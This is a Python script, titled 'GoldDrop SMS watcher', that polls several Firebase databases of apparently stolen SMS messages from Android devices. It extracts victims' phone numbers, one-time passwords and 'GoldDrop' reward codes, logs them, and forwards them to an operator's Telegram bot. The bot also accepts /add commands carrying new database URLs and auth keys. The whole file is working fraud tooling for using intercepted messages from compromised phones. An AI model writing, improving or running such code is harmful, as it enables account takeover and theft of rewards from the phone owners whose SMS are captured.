#!/usr/bin/env python3
"""GoldDrop SMS watcher — Firebase RTDB + Telegram alerts & remote DB manager.

Reward Code = EXACTLY 12 alphanumeric characters (A-Z + 0-9).
"""
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

try:
    import winsound
except ImportError:
    winsound = None  # non-Windows: beep skip

sys.stdout.reconfigure(encoding="utf-8")
import functools
print = functools.partial(print, flush=True)

# ─── Paths ───
BASE = os.path.dirname(os.path.abspath(__file__))
FB_FILE = os.path.join(BASE, "golddrop_firebase.txt")
SEEN_FILE = os.path.join(BASE, "golddrop_seen.json")
TG_FILE = os.path.join(BASE, "golddrop_telegram.json")
REWARD_LOG = os.path.join(BASE, "golddrop_rewards.txt")

# ─── Telegram Credentials ───
BOT_TOKEN = ""
CHAT_ID = 0

# ─── Config ───
REDEEM_URL = "https://www.golddropwins.com/"
FILTER = "GoldDrop"
INTERVAL = 15
BASE_LAST = 30
POLL_LAST = 10
TG_REWARD_ONLY = True
CODE_LEN = 12   # confirmed: 3PR9TXW7DNWU = 12 chars

DEFAULT_DBS = [
    # apne Firebase DB URLs yahan (optional):
]

WORKERS = 20
DB_LOCK = threading.Lock()

OTP_PATTERNS = [
    re.compile(r"OTP to register is\s*(\d{4,8})", re.I),
    re.compile(r"OTP[:\s]+(?:is\s*)?(\d{4,8})", re.I),
    re.compile(r"(?:code|otp|key)[^\d]{0,20}(\d{6})", re.I),
    re.compile(r"\b(\d{6})\b"),
]

# ─── Reward Code — locked to 12 alnum chars ───
REWARD_PATTERNS = [
    re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Z0-9]{{{CODE_LEN}}})\b", re.I),
    re.compile(rf"Reward\s*Code[^\w]{{0,20}}([A-Z0-9]{{{CODE_LEN}}})\b", re.I),
    re.compile(rf"Reward\s*Code\s*is\s*\*?\s*([A-Za-z0-9]{{8,20}})\b", re.I),
]


def is_reward(sender, text):
    t = (text or "").lower()
    s = (sender or "").lower()
    if "golddropwins" in t:
        return True
    if "reward" in t and "code" in t and (
        "golddrop" in t or "gold drop" in t or "bigcity" in t or "golddrop" in s
    ):
        return True
    return False


def extract_reward(text):
    for rx in REWARD_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1).rstrip(".*")
    return ""


def extract_otp(text):
    for rx in OTP_PATTERNS:
        m = rx.search(text or "")
        if m:
            return m.group(1)
    return ""


# ─── Database File Management ───
def load_dbs():
    with DB_LOCK:
        out = []
        seen_urls = set()
        if os.path.exists(FB_FILE):
            with open(FB_FILE, encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split("|||")
                    url = parts[0].strip().rstrip("/")
                    key = parts[1].strip() if len(parts) > 1 else ""
                    if url and (url, key) not in seen_urls:
                        out.append((url, key))
                        seen_urls.add((url, key))
        if not out and DEFAULT_DBS:
            for u in DEFAULT_DBS:
                parts = u.split("|||")
                url = parts[0].strip().rstrip("/")
                key = parts[1].strip() if len(parts) > 1 else ""
                if url and (url, key) not in seen_urls:
                    out.append((url, key))
                    seen_urls.add((url, key))
        return out


def save_dbs(db_list):
    with DB_LOCK:
        with open(FB_FILE, "w", encoding="utf-8") as f:
            for url, key in db_list:
                if key:
                    f.write(f"{url}|||{key}\n")
                else:
                    f.write(f"{url}\n")


def parse_db_entries(raw_text):
    """Text me se ek ya ek se zyada Firebase URLs (optional |||key ke saath) nikalta hai."""
    entries = []
    # Split by whitespace or commas
    tokens = re.split(r"[\s,]+", raw_text.strip())
    for tok in tokens:
        tok = tok.strip()
        if not tok:
            continue
        parts = tok.split("|||")
        url = parts[0].strip().rstrip("/")
        key = parts[1].strip() if len(parts) > 1 else ""
        if url.startswith("http://") or url.startswith("https://"):
            entries.append((url, key))
    return entries


def load_seen():
    try:
        with open(SEEN_FILE, encoding="utf-8") as f:
            return set(json.load(f))
    except Exception:
        return set()


def save_seen(seen):
    try:
        with open(SEEN_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(seen), f)
    except Exception:
        pass


def load_tg_config():
    if BOT_TOKEN and CHAT_ID:
        return {"bot_token": BOT_TOKEN, "chat_id": CHAT_ID}

    try:
        with open(TG_FILE, encoding="utf-8") as f:
            cfg = json.load(f)
        if cfg.get("bot_token") and cfg.get("chat_id"):
            return cfg
    except Exception:
        pass

    cfg = {"bot_token": "", "chat_id": 0}
    try:
        with open(TG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
    except Exception:
        pass
    return cfg


# ─── Telegram ───
def tg_check(session, token):
    try:
        r = session.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        d = r.json()
        if d.get("ok"):
            return True, "@" + str(d["result"].get("username", "?"))
        return False, str(d)[:100]
    except Exception as e:
        return False, str(e)[:100]


def tg_send(session, token, chat, text):
    try:
        # Telegram message limit is 4096 chars
        for i in range(0, len(text), 4000):
            chunk = text[i:i + 4000]
            r = session.post(f"https://api.telegram.org/bot{token}/sendMessage",
                             json={"chat_id": chat, "text": chunk, "disable_web_page_preview": True},
                             timeout=15)
            if r.status_code != 200:
                return False
        return True
    except Exception:
        return False


def format_tg(h):
    phone = f"+91{h['phone']}" if h["phone"] else h["device"][:12]
    meta = f"{phone} | {h['sender']} | {h['ts']}"

    if h["reward"]:
        warn = "" if len(h["reward"]) == CODE_LEN else f"\n⚠️ len={len(h['reward'])} (expected {CODE_LEN})"
        return (f"🎁 GoldDrop REWARD CODE!\n\n"
                f"Code: {h['reward']}\n"
                f"Redeem: {REDEEM_URL}{warn}\n\n"
                f"📱 {meta}")

    if h["otp"]:
        return (f"🔑 GoldDrop OTP: {h['otp']}\n\n"
                f"📱 {meta}")

    return (f"📩 GoldDrop msg ({h['sender']}):\n{h['text'][:300]}\n\n"
            f"📱 {meta}")


# ─── Telegram Command Listener (Background Thread) ───
def handle_tg_command(session, token, chat_id, text):
    text = text.strip()
    lower = text.lower()

    if lower.startswith("/start") or lower.startswith("/help"):
        msg = (
            "🤖 GoldDrop Monitor Commands:\n\n"
            "➕ /add <url1> <url2> ...\n"
            "   (Ek saath multiple URLs ya seedha URLs bhej sakte hain. Auth key ho toh URL|||KEY likhein)\n\n"
            "📋 /list — Saved Firebase URLs dekhein\n"
            "🗑️ /remove <number ya url> — Kisi URL ko hatayein (e.g. /remove 1 ya /remove 1 2)\n"
            "🧹 /clear — Saare saved URLs delete karein"
        )
        tg_send(session, token, chat_id, msg)
        return

    if lower.startswith("/list"):
        dbs = load_dbs()
        if not dbs:
            tg_send(session, token, chat_id, "📭 Abhi koi Firebase URL saved nahi hai.\nAdd karne ke liye /add <url> bhejein.")
            return
        lines = [f"📋 Active Firebase Databases ({len(dbs)}):\n"]
        for idx, (u, k) in enumerate(dbs, 1):
            k_tag = " [Auth Key]" if k else ""
            lines.append(f"{idx}. {u}{k_tag}")
        tg_send(session, token, chat_id, "\n".join(lines))
        return

    if lower.startswith("/clear"):
        save_dbs([])
        print("[tg-cmd] Saare Firebase URLs clear kar diye gaye.")
        tg_send(session, token, chat_id, "🧹 Saare Firebase URLs delete kar diye gaye hain.")
        return

    if lower.startswith("/remove") or lower.startswith("/del"):
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            tg_send(session, token, chat_id, "⚠️ Usage: /remove 1 (ya URL paste karein)")
            return
        arg = parts[1].strip()
        dbs = load_dbs()
        if not dbs:
            tg_send(session, token, chat_id, "📭 List pehle se khali hai.")
            return

        tokens = re.split(r"[\s,]+", arg)
        indices_to_remove = set()
        urls_to_remove = set()

        for t in tokens:
            if t.isdigit():
                idx = int(t) - 1
                if 0 <= idx < len(dbs):
                    indices_to_remove.add(idx)
            else:
                urls_to_remove.add(t.split("|||")[0].strip().rstrip("/"))

        new_dbs = []
        removed_count = 0
        for i, (u, k) in enumerate(dbs):
            if i in indices_to_remove or u in urls_to_remove:
                removed_count += 1
            else:
                new_dbs.append((u, k))

        if removed_count > 0:
            save_dbs(new_dbs)
            print(f"[tg-cmd] {removed_count} Firebase URL(s) remove kiye gaye.")
            tg_send(session, token, chat_id, f"🗑️ {removed_count} database(s) remove kar diye gaye.\nAb total active: {len(new_dbs)}")
        else:
            tg_send(session, token, chat_id, "❌ Koi matching URL ya number nahi mila. /list check karein.")
        return

    # /add command OR direct URLs pasted in chat
    is_add_cmd = lower.startswith("/add")
    raw_urls = text[4:].strip() if is_add_cmd else text
    entries = parse_db_entries(raw_urls)

    if entries:
        dbs = load_dbs()
        existing = set(dbs)
        added = []
        skipped = 0

        for entry in entries:
            if entry not in existing:
                dbs.append(entry)
                existing.add(entry)
                added.append(entry[0])
            else:
                skipped += 1

        if added:
            save_dbs(dbs)
            print(f"[tg-cmd] {len(added)} naye Firebase URL(s) add & save kiye gaye.")
            reply = f"✅ {len(added)} naye Firebase URL(s) add aur save ho gaye!\n"
            if skipped:
                reply += f"⏭️ {skipped} pehle se saved the.\n"
            reply += f"📊 Total Active DBs: {len(dbs)}"
            tg_send(session, token, chat_id, reply)
        else:
            tg_send(session, token, chat_id, f"ℹ️ Yeh saare ({skipped}) URLs pehle se saved hain. Total: {len(dbs)}")
    elif is_add_cmd:
        tg_send(session, token, chat_id, "⚠️ Valid Firebase URL bhejein.\nExample:\n/add https://db1.firebaseio.com https://db2.firebaseio.com")


def tg_poller_worker(token, allowed_chat_id):
    """Background thread jo Telegram se commands sunta hai."""
    poll_session = requests.Session()
    offset = 0

    # Purane pending messages skip karne ke liye initial offset lein
    try:
        r = poll_session.get(f"https://api.telegram.org/bot{token}/getUpdates",
                             params={"timeout": 1, "offset": -1}, timeout=10)
        data = r.json()
        if data.get("ok") and data.get("result"):
            offset = data["result"][-1]["update_id"] + 1
    except Exception:
        pass

    while True:
        try:
            r = poll_session.get(f"https://api.telegram.org/bot{token}/getUpdates",
                                 params={"timeout": 20, "offset": offset}, timeout=30)
            data = r.json()
            if not data.get("ok"):
                time.sleep(3)
                continue

            for upd in data.get("result", []):
                offset = upd["update_id"] + 1
                msg = upd.get("message") or upd.get("edited_message")
                if not msg:
                    continue
                sender_chat_id = msg.get("chat", {}).get("id")
                text = msg.get("text", "")
                if not text:
                    continue

                # Sirf authorized Chat ID ko allow karein
                if str(sender_chat_id) == str(allowed_chat_id):
                    handle_tg_command(poll_session, token, sender_chat_id, text)
        except Exception:
            time.sleep(3)


# ─── Firebase ───
def fb_get(session, base, path, key=""):
    url = f"{base}/{path}"
    if key:
        url += f"?auth={key}" if "?" not in url else f"&auth={key}"
    try:
        r = session.get(url, timeout=10)
        if r.status_code == 200:
            return True, r.json()
        return False, f"HTTP {r.status_code} {r.text[:120]}"
    except Exception as e:
        return False, f"ERR {str(e)[:80]}"


def extract_phone(dev):
    def valid(m):
        m = re.sub(r"[^0-9]", "", str(m or ""))
        return m if len(m) == 10 and m[0] in "6789" else ""

    if not isinstance(dev, dict):
        return ""
    for k in ("mobNo", "phoneNumber", "phone", "mobile", "msisdn", "subId", "number"):
        if dev.get(k):
            r = valid(dev[k])
            if r:
                return r
    for container in ("sims", "action", "sms", "smsCommand", "webhookEvent",
                      "sendSms", "commands"):
        c = dev.get(container)
        items = list(c.values()) + [c] if isinstance(c, dict) else (c if isinstance(c, list) else [])
        for it in items:
            if isinstance(it, dict):
                for k in ("phoneNumber", "number", "phone", "msisdn", "to",
                          "mobile", "subId"):
                    if it.get(k):
                        r = valid(it[k])
                        if r:
                            return r
    return ""


def is_hit(sender, text, needle):
    n = needle.lower()
    s = (sender or "").lower()
    t = (text or "").lower()
    return (
        n in s
        or "golddrop" in s or "gold drop" in s
        or "golddrop" in t or "gold drop" in t
        or "golddropwins" in t
        or "bigcity" in t
    )


def scan_db(session, base, key, last, needle):
    ok, clients = fb_get(session, base, "clients.json", key)
    if not ok:
        return 0, 0, [], clients
    if not isinstance(clients, dict):
        return 0, 0, [], "empty/invalid clients"

    dev_ids = list(clients.keys())
    phones = {d: extract_phone(clients[d]) for d in dev_ids}

    def fetch(did):
        ok2, data = fb_get(
            session, base,
            f"messages/{did}.json?orderBy=\"$key\"&limitToLast={last}", key)
        return did, ok2, data

    msgs, hits = 0, []
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        futs = {ex.submit(fetch, d): d for d in dev_ids}
        for fu in as_completed(futs):
            did = futs[fu]
            try:
                _, ok2, data = fu.result()
            except Exception:
                continue
            if not ok2 or not isinstance(data, dict):
                continue
            for mk, m in data.items():
                if not isinstance(m, dict):
                    continue
                text = str(m.get("message", "") or m.get("body", "") or m.get("text", ""))
                sender = str(m.get("sender", "") or m.get("from", "") or m.get("address", ""))
                if not text.strip():
                    continue
                msgs += 1
                if is_hit(sender, text, needle):
                    hits.append({
                        "db": base, "device": did,
                        "phone": phones.get(did, ""),
                        "key": f"{base}|{did}|{mk}",
                        "msgid": str(mk),
                        "sender": sender,
                        "ts": str(m.get("dateTime", "") or m.get("time", "") or m.get("timestamp", "")),
                        "text": text,
                        "otp": extract_otp(text),
                        "reward": extract_reward(text),
                    })
    return len(dev_ids), msgs, hits, ""


def log_reward(h):
    try:
        with open(REWARD_LOG, "a", encoding="utf-8") as f:
            f.write(f"{h['ts']} | +91{h['phone'] or '?'} | "
                    f"{h['reward'] or 'NO-CODE-PARSE'} | len={len(h['reward'] or '')} | "
                    f"{h['sender']} | {h['device']} | {h['db']}\n")
    except Exception:
        pass


def send_tg(tg, h):
    if tg and tg.get("ok"):
        if tg_send(tg["session"], tg["token"], tg["chat"], format_tg(h)):
            print("  [tg] Telegram bhej diya ✓")
        else:
            print("  [tg] bhejne me fail ✗")


def print_hit(h, tg=None):
    reward = bool(h["reward"]) or is_reward(h["sender"], h["text"])
    phone = f"+91{h['phone']}" if h['phone'] else h['device'][:12]

    if reward:
        code = h["reward"]
        clen = len(code) if code else 0
        len_tag = f"✓ len={clen}" if clen == CODE_LEN else f"⚠️ len={clen} (expected {CODE_LEN})"

        print("\n" + "!" * 70)
        print(f"🎁🎁🎁 GOLD DROP REWARD CODE! [{h['sender']}] {h['ts']}")
        print(f"  phone: {phone}")
        print(f"  CODE : {code or 'parse nahi hua — text dekho'}   [{len_tag}]")
        print(f"  REDEEM: {REDEEM_URL}")
        print(f"  full: {h['text'][:400]}")
        print("!" * 70)

        log_reward(h)
        print(f"  [log] {REWARD_LOG} me likh diya")

        if winsound:
            try:
                for _ in range(3):
                    winsound.Beep(1500, 350)
            except Exception:
                pass

        send_tg(tg, h)
        return

    # normal OTP/info — console pe
    print("\n" + "=" * 70)
    print(f"[HIT] {h['sender']}  {h['ts']}")
    print(f"  db: {h['db'][:60]}")
    print(f"  device: {h['device']}" + (f"  phone: +91{h['phone']}" if h['phone'] else ""))
    print(f"  text: {h['text'][:400]}")
    if h["otp"]:
        print(f"  >>> OTP: {h['otp']}")
    if not TG_REWARD_ONLY:
        send_tg(tg, h)


def main():
    print("=" * 70)
    print(f"  GoldDrop SMS Monitor  (CODE_LEN={CODE_LEN})")
    print("=" * 70)

    dbs = load_dbs()
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    # Telegram setup
    cfg = load_tg_config()
    tg = {"ok": False, "session": session, "token": "", "chat": 0}
    if cfg.get("bot_token") and cfg.get("chat_id"):
        ok, info = tg_check(session, cfg["bot_token"])
        if ok:
            tg = {"ok": True, "session": session,
                  "token": cfg["bot_token"], "chat": cfg["chat_id"]}
            print(f"[tg] connected: {info} -> chat {cfg['chat_id']}")
            start_msg = (
                f"✅ GoldDrop Monitor STARTED\n"
                f"Active Databases: {len(dbs)}\n"
                f"Code length: {CODE_LEN}\n\n"
                f"💡 Naye Firebase URLs add karne ke liye seedha URLs bhejein ya /add <urls> use karein."
            )
            if tg_send(session, cfg["bot_token"], cfg["chat_id"], start_msg):
                print("[tg] test msg OK ✓")
            else:
                tg["ok"] = False
                print("[tg] test msg FAIL ✗ — bot ko /start karo, phir restart")

            # Start background Telegram command listener
            t = threading.Thread(
                target=tg_poller_worker,
                args=(cfg["bot_token"], cfg["chat_id"]),
                daemon=True
            )
            t.start()
            print("[tg] Command listener active (/add, /list, /remove, /clear)")
        else:
            print(f"[tg] token fail ({info}) — sirf console mode")
    else:
        print(f"[tg] {TG_FILE} me bot_token + chat_id bharo")

    print(f"\nWatching {len(dbs)} DBs | filter='{FILTER}' | poll={INTERVAL}s | code_len={CODE_LEN}")
    if not dbs:
        print("⚠️  Abhi koi DB saved nahi hai — Telegram bot par /add <url> bhej kar add karein!")

    seen = load_seen()
    initialized_dbs = set()

    for base, key in dbs:
        nd, nm, hits, err = scan_db(session, base, key, BASE_LAST, FILTER)
        for h in hits:
            seen.add(h["key"])
        initialized_dbs.add((base, key))
        print(f"  base {base[:55]}: devices={nd} msgs={nm} old_hits={len(hits)}"
              + (f" X {err}" if err else ""))
    save_seen(seen)

    print(f"\nLIVE... naya GoldDrop msg = console + beep + Telegram.  Ctrl+C to stop.\n")

    try:
        while True:
            time.sleep(INTERVAL)
            current_dbs = load_dbs()
            for base, key in current_dbs:
                # Agar Telegram se naya DB add hua hai toh pehle uske purane hits skip karein
                if (base, key) not in initialized_dbs:
                    nd, nm, old_hits, err = scan_db(session, base, key, BASE_LAST, FILTER)
                    for h in old_hits:
                        seen.add(h["key"])
                    initialized_dbs.add((base, key))
                    save_seen(seen)
                    print(f"[new-db] {base[:55]}: devices={nd} msgs={nm} old_hits={len(old_hits)}"
                          + (f" X {err}" if err else ""))
                    continue

                try:
                    _, _, hits, _ = scan_db(session, base, key, POLL_LAST, FILTER)
                except Exception as e:
                    print(f"  [warn] {base[:50]}: {str(e)[:60]}")
                    continue
                fresh = [h for h in hits if h["key"] not in seen]
                for h in sorted(fresh, key=lambda x: x["msgid"]):
                    print_hit(h, tg)
                    seen.add(h["key"])
                if fresh:
                    save_seen(seen)
    except KeyboardInterrupt:
        print("\nRuka. seen-state saved.")
        save_seen(seen)
    return 0


if __name__ == "__main__":
    sys.exit(main())
